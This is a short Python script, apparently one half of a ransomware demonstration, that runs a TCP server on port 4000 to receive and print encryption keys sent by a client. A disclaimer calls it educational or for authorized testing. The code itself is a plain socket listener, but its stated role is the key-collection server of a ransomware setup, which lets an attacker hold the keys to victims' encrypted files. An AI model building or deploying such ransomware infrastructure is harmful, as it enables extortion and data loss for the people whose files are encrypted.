"""
DISCLAIMER:
This code is for educational or authorized testing purposes. 
Use responsibly and ensure you have permission before running
any ransomware-like encryption demonstration.

Author: [Your Name]
Date: [Date]

Description:
    A simple server that binds to a specified HOST and PORT,
    listens for incoming connections, and receives data
    (in this case, an encryption key) from the client.
"""

import socket
import sys

def main():
    # Host can be '0.0.0.0' to listen on all interfaces
    HOST = '0.0.0.0'
    PORT = 4000  # Must match the port the client is sending to

    try:
        # Create socket (IPv4, TCP)
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Optional: Reuse address if in TIME_WAIT
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind to the specified interface and port
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        print(f"Server listening on {HOST}:{PORT}")

        while True:
            # Accept an incoming connection
            conn, addr = server_socket.accept()
            print(f"[+] Connection from {addr}")

            # Receive up to 1024 bytes of data (the key, in this case)
            key_data = conn.recv(1024)
            if not key_data:
                # Client disconnected without sending data
                conn.close()
                continue

            # Log or store the key
            print(f"[+] Received key: {key_data}")

            # (Optional) Send response to the client
            conn.sendall(b"Key received on the server side.")

            # Close the connection
            conn.close()

    except KeyboardInterrupt:
        print("\n[!] Server interrupted by user, shutting down.")
    except Exception as e:
        print(f"[!] Server error: {e}")
    finally:
        # Always try to clean up the socket
        server_socket.close()
        print("[+] Server socket closed.")

if __name__ == "__main__":
    main()
